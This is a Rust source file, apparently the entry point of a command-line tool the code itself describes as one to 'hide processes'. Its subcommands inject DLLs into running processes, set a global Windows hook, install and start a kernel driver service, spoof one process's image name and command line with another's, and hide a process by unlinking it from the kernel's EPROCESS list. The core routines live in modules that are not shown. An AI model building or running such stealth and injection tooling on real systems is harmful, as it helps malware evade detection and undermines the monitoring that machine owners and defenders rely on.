mod chainbreak;
mod process;
mod utils;

use crate::chainbreak::BreakChain;
use crate::process::{FakeProcess, ObjProcess, Process, SetImageName};
use crate::utils::*;
use clap::{command, Parser, Subcommand};
use log::{debug, info, warn};
use std::env::set_var;

#[derive(Parser)]
#[command(author = "mi1itray.axe", version = "0.1", about = "A simple tool to hide processes in R3", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Option<Command>,

    #[arg(short, long)]
    debug: bool,
}

#[derive(Subcommand)]
enum Command {
    /// copy some strings of process `obj` to process `fake`.
    CopyStr {
        #[arg(short, long, value_name = "PID")]
        obj: u32,

        #[arg(short, long, value_name = "PID")]
        fake: u32,
    },

    /// Inject dll to the process
    InjectDll {
        /// dll file path
        #[arg(short, long, value_name = "DLL PATH")]
        dll_path: String,

        /// process id which you want to inject it. pid or name just need one
        #[arg(short, long, value_name = "PROCESS PID")]
        pid: Option<u32>,

        /// process name which you want to inject it. pid or name just need one
        #[arg(short, long, value_name = "PROCESS NAME")]
        name: Option<String>,
    },

    /// Use SetWindowsHookEx to global hook
    WindowsHook {
        /// dll file path
        #[arg(short, long, value_name = "DLL PATH")]
        dll_path: String,
    },

    /// Install Services
    Services {
        /// sys file path
        #[arg(short, long, value_name = "SYS PATH")]
        sys: String,

        /// service name
        #[arg(short, long, value_name = "SERVICE NAME")]
        name: String,
    },

    /// Break the chain in Ring0 to hide process
    ChainBreak {
        /// The process pid you want tio hide
        #[arg(short, long, value_name = "PID")]
        pid: u32,
    },
}

fn copy_str_2_process(obj: u32, fake: u32) {
    let obj_process = ObjProcess::from(obj);
    let mut fake_process = FakeProcess::from(fake);
    let command_line = obj_process
        .get_command_line_2_vec()
        .expect("[! Hide Process R3] Get Command Line failed.");
    let image_name = obj_process
        .get_image_name_2_vec()
        .expect("[! Hide Process R3] Get Image Name failed.");
    debug!("{:#?}", Process::pwstr_to_string(&command_line));
    debug!("{:#?}", Process::pwstr_to_string(&image_name));

    // set string to ring0 eprocess->ImageFileName

    let new_image_name = Process::pwstr_to_string(&image_name);
    let set = SetImageName::new(new_image_name, fake as u64);
    SetImageName::set(set).expect("[! Hide Process R3] error.");

    fake_process
        .set_command_line(command_line)
        .expect("[! Hide Process R3] Set Command Line failed.");
    fake_process
        .set_image_name(image_name)
        .expect("[! Hide Process R3] Set Image Name failed.");
}

/// 注入Dll文件进入到进程中
///
/// # 参数
///
/// * `dll_path` - 需要注入的dll文件
/// * `pid` - 被注入的进程id
/// * `name` - 被注入的进程名称, pid, name两者选一个即可
fn inject_dll_2_process(dll_path: &String, pid: &Option<u32>, name: Option<&String>) {
    debug!("Dll path: {}; Pid: {:?}; Name: {:?}", dll_path, pid, name);
    if pid.is_none() && name.is_none() {
        warn!("[! Hide Process R3] pid and name must have at least one parameter.");
    } else {
        match pid {
            None => Inject::inject_dll_by_name(dll_path, name.unwrap().as_str()),
            Some(id) => Inject::inject_dll_by_pid(dll_path, *id),
        }
        info!("Inject dll success");
    }
}

fn set_windows_hook(dll_path: *const u8) {
    match WindowsHook::hook(dll_path) {
        Err(e) => warn!("SetWindowsHookEx failed: {:?}", e),
        Ok(_) => info!("SetWindowsHookEx success"),
    }
}

/// 安装驱动服务
///
/// # 参数
///
/// * `sys` - 驱动文件路径, 可以相对路径也可以绝对路径
/// * `name` - 驱动服务名称
fn install_srv(sys: &str, name: &str) {
    debug!("Try to install {} as Service: {}", sys, name);
    match Service::install(sys, name) {
        Err(_) => {
            debug!("service exists try to delete it.");
            if let Err(e) = Service::delete(name) {
                warn!("Delete service failed: {:?}, try install again", e);
            }

            // try to install service success

            if let Err(e) = Service::install(sys, name) {
                warn!("Install service failed: {:?}", e);
            }

            let _ = Service::start(name).map(|_| info!("Service is running now!"));
        }
        Ok(_) => {
            info!("Install Service Success");
            let _ = Service::start(name).map(|_| info!("Service is running now!"));
        }
    }
}

/// 通过R0中EPROCESS断联隐藏指定进程
///
/// # 参数
///
/// * `pid` - 需要隐藏的进程pid
fn hide_by_break_chain(pid: u32) {
    debug!("Hide pid: {} by Break Chains in EPROCESS", pid);
    match BreakChain::hide_by_pid(pid) {
        Ok(_) => info!("Hide Process by Break Chains success"),
        Err(e) => warn!("Hide Process failed: {:?}", e),
    }
}

fn main() {
    let args: Cli = Cli::parse();

    // Set Debug logger;
    if args.debug {
        set_var("RUST_LOG", "debug");
    } else {
        set_var("RUST_LOG", "info")
    }

    env_logger::init();

    match &args.command {
        Some(Command::CopyStr { obj, fake }) => copy_str_2_process(*obj, *fake),
        Some(Command::InjectDll {
            dll_path,
            pid,
            name,
        }) => inject_dll_2_process(dll_path, pid, name.as_ref()),
        Some(Command::WindowsHook { dll_path }) => set_windows_hook(dll_path.as_ptr()),
        Some(Command::Services { sys, name }) => install_srv(sys, name),
        Some(Command::ChainBreak { pid }) => hide_by_break_chain(*pid),
        _ => {}
    }
}
